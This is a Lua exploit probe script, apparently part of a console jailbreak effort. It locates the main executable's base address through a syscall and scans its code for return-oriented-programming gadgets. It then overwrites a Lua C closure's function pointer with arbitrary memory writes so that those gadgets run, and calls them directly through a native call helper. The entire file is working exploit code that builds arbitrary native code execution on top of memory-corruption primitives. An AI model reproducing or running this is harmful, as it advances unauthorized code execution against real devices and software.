-- CRASH_CLASS: MODERATE
-- PROBE 56g: CClosure redirect to eboot gadgets
--
-- Context: 56c/56f confirmed that CClosure +0x20 function pointer redirect
-- works for selected existing Lua C targets (rawequal->rawget, etc.).
-- This probe attempts to redirect +0x20 to eboot RX gadgets to test
-- if we can execute arbitrary eboot addresses and observe effects.
--
-- Strategy:
--   1. Find eboot base via dynlib_get_info
--   2. Scan eboot .text for useful gadgets (ret, pop rdi;ret, etc.)
--   3. Redirect a CClosure's +0x20 to each gadget
--   4. Call the function and observe return values/effects
--   5. Build a catalog of callable gadgets

print("=== PROBE 56g: CCLOSURE GADGET REDIRECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- ============================================================
-- SECTION A: EBOOT BASE + GADGET CATALOG
-- ============================================================
print("")
print("--- SECTION A: EBOOT SCAN ---")

-- Get eboot base (handle 0)
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), uint64(to_num(info))) end)

local eboot_lo = safe_rd(info + 0x108)
local eboot_hi = safe_rd(info + 0x10C)
local eboot_size = safe_rd(info + 0x110)
print(string.format("eboot text=0x%08X_%08X size=0x%X", eboot_hi or 0, eboot_lo or 0, eboot_size or 0))

if not eboot_lo or not eboot_hi then
    print("Failed to get eboot base")
    print("=== PROBE 56g COMPLETE ===")
    return
end

local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))

-- Scan for gadgets in eboot .text (RX, safe to read)
-- Look for: C3 (ret), 5F C3 (pop rdi; ret), 5E C3 (pop rsi; ret),
-- 5A C3 (pop rdx; ret), 58 C3 (pop rax; ret), 59 C3 (pop rcx; ret)
local gadgets = {}
local scan_size = math.min(eboot_size or 0x100000, 0x100000)

print("Scanning " .. scan_size .. " bytes for gadgets...")

for off = 0, scan_size - 2, 1 do
    local ok, b1 = pcall(function() return memory.read_byte(eboot_base + off) end)
    if not ok then break end
    b1 = to_num(b1)

    if b1 == 0xC3 then
        -- Pure ret gadget
        if #gadgets < 50 then
            gadgets[#gadgets + 1] = {off = off, name = "ret", addr = eboot_base + off}
            if #gadgets <= 3 then
                print(string.format("  +0x%X: ret (0xC3)", off))
            end
        end
    end

    if off < scan_size - 2 then
        local ok2, b2 = pcall(function() return memory.read_byte(eboot_base + off + 1) end)
        if ok2 then
            b2 = to_num(b2)
            if b2 == 0xC3 then
                if b1 == 0x5F then
                    gadgets[#gadgets + 1] = {off = off, name = "pop_rdi_ret", addr = eboot_base + off}
                    print(string.format("  +0x%X: pop rdi; ret", off))
                elseif b1 == 0x5E then
                    gadgets[#gadgets + 1] = {off = off, name = "pop_rsi_ret", addr = eboot_base + off}
                    print(string.format("  +0x%X: pop rsi; ret", off))
                elseif b1 == 0x5A then
                    gadgets[#gadgets + 1] = {off = off, name = "pop_rdx_ret", addr = eboot_base + off}
                    print(string.format("  +0x%X: pop rdx; ret", off))
                elseif b1 == 0x58 then
                    gadgets[#gadgets + 1] = {off = off, name = "pop_rax_ret", addr = eboot_base + off}
                    print(string.format("  +0x%X: pop rax; ret", off))
                elseif b1 == 0x59 then
                    gadgets[#gadgets + 1] = {off = off, name = "pop_rcx_ret", addr = eboot_base + off}
                    print(string.format("  +0x%X: pop rcx; ret", off))
                end
            end
        end
    end

    -- Limit scan time
    if #gadgets >= 100 then break end
end

print("Found " .. #gadgets .. " gadgets")

-- ============================================================
-- SECTION B: CCLOSURE +0x20 REDIRECT TO GADGETS
-- ============================================================
print("")
print("--- SECTION B: CCLOSURE REDIRECT ---")

-- Get the CClosure for a known function (rawequal)
-- CClosure layout: at +0x20 is the C function pointer
local rawequal_str = tostring(rawequal)
print("rawequal=" .. rawequal_str)

-- Find the CClosure struct by reading the function's internal representation
-- In Lua 5.1, a C function's address can be found via debug or string tricks
-- But we need the CClosure's address to modify +0x20

-- Alternative: use the approach from 56c — get function address via tostring
-- tostring(func) gives "function: 0xXXXX"
local func_addr_str = rawequal_str:match("0x([0-9a-fA-F]+)")
if not func_addr_str then
    print("Cannot extract rawequal address")
    print("=== PROBE 56g COMPLETE ===")
    return
end

-- Lua function object address
local func_addr = uint64("0x" .. func_addr_str)
print("rawequal obj addr=" .. fmt_addr(func_addr))

-- Read the current C function pointer at +0x20
local original_cfunc = safe_rq(func_addr + 0x20)
print("rawequal +0x20 (original cfunc)=" .. fmt_addr(original_cfunc))

if not original_cfunc then
    print("Cannot read +0x20")
    print("=== PROBE 56g COMPLETE ===")
    return
end

-- Test: redirect rawequal's +0x20 to a RET gadget
-- If the gadget executes, rawequal(1,2) should return whatever RAX happens to be
-- instead of comparing 1==2
print("")
print("Testing gadget redirects...")

-- Find a ret gadget
local ret_gadget = nil
for _, g in ipairs(gadgets) do
    if g.name == "ret" then
        ret_gadget = g
        break
    end
end

if not ret_gadget then
    print("No ret gadget found!")
    print("=== PROBE 56g COMPLETE ===")
    return
end

print("Using ret gadget at +0x" .. string.format("%X", ret_gadget.off))

-- Save original
local saved = safe_rq(func_addr + 0x20)

-- Test 1: redirect to ret gadget
safe_wq(func_addr + 0x20, ret_gadget.addr)
local ok1, r1 = pcall(function() return rawequal(1, 2) end)
print(string.format("ret gadget: ok=%s result=%s type=%s",
    tostring(ok1), tostring(r1), type(r1)))

-- Restore
safe_wq(func_addr + 0x20, saved)

-- Verify restore worked
local ok_v, r_v = pcall(function() return rawequal(1, 1) end)
print(string.format("restore verify: rawequal(1,1)=%s (should be true)",
    tostring(r_v)))

-- Test 2: redirect to pop_rdi_ret gadget
local pop_rdi = nil
for _, g in ipairs(gadgets) do
    if g.name == "pop_rdi_ret" then
        pop_rdi = g
        break
    end
end

if pop_rdi then
    print("")
    print("Testing pop rdi; ret gadget at +0x" .. string.format("%X", pop_rdi.off))
    saved = safe_rq(func_addr + 0x20)
    safe_wq(func_addr + 0x20, pop_rdi.addr)
    local ok2, r2 = pcall(function() return rawequal(42, 99) end)
    print(string.format("pop_rdi_ret: ok=%s result=%s type=%s",
        tostring(ok2), tostring(r2), type(r2)))
    safe_wq(func_addr + 0x20, saved)

    -- Verify
    local ok_v2, r_v2 = pcall(function() return rawequal(1, 1) end)
    print("restore verify: " .. tostring(r_v2))
end

-- Test 3: try several Lua C functions as redirect targets
print("")
print("--- SECTION C: MULTI-FUNCTION REDIRECT TEST ---")

local test_funcs = {
    {name = "rawequal", func = rawequal, args = function() return 1, 2 end},
    {name = "rawget", func = rawget, args = function() return {x=1}, "x" end},
    {name = "type", func = type, args = function() return 42 end},
    {name = "tostring", func = tostring, args = function() return 42 end},
}

for _, tf in ipairs(test_funcs) do
    local fstr = tostring(tf.func)
    local fa = fstr:match("0x([0-9a-fA-F]+)")
    if fa then
        local faddr = uint64("0x" .. fa)
        local orig = safe_rq(faddr + 0x20)
        if orig then
            -- Read original function pointer bytes to see what it points to
            local target_bytes = {}
            local th, tl = get_hi_lo(orig)
            -- Only read if it's in eboot range (RX, safe)
            if th == eboot_hi then
                for i = 0, 7 do
                    local ok, b = pcall(function() return memory.read_byte(orig + i) end)
                    if ok then target_bytes[#target_bytes + 1] = string.format("%02X", to_num(b))
                    else target_bytes[#target_bytes + 1] = "??" end
                end
            end
            print(string.format("  %s: obj=%s +0x20=%s bytes=%s",
                tf.name, fmt_addr(faddr), fmt_addr(orig),
                table.concat(target_bytes, " ")))
        end
    end
end

-- ============================================================
-- SECTION D: native.fcall_with_rax GADGET EXEC
-- ============================================================
print("")
print("--- SECTION D: FCALL GADGET TEST ---")

-- Since we have native.fcall_with_rax, test calling eboot gadgets directly
-- This is a more reliable way to execute gadgets than CClosure redirect
if native and native.fcall_with_rax then
    local stub = syscall.pipe.fn_addr

    -- Test: call ret gadget via fcall_with_rax
    -- fcall_with_rax(stub, syscall_num, ...) — but we want to call arbitrary addresses
    -- Actually, fcall_with_rax uses stub as the function to call
    -- So fcall_with_rax(gadget_addr, ...) should call the gadget!

    -- Test with getpid first to confirm
    local test_pid = native.fcall_with_rax(stub, 20)
    print("fcall_with_rax getpid=" .. tostring(test_pid))

    -- Now try calling the ret gadget directly
    -- fcall_with_rax(ret_gadget_addr) — returns whatever RAX is
    local ok_r, r_r = pcall(function()
        return native.fcall_with_rax(ret_gadget.addr, 0)
    end)
    print(string.format("fcall(ret_gadget): ok=%s result=%s",
        tostring(ok_r), tostring(r_r)))

    -- Try calling pop_rdi;ret with a known value
    if pop_rdi then
        local ok_p, r_p = pcall(function()
            return native.fcall_with_rax(pop_rdi.addr, 0x41414141)
        end)
        print(string.format("fcall(pop_rdi_ret, 0x41414141): ok=%s result=%s",
            tostring(ok_p), tostring(r_p)))
    end
end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 56g COMPLETE ===")
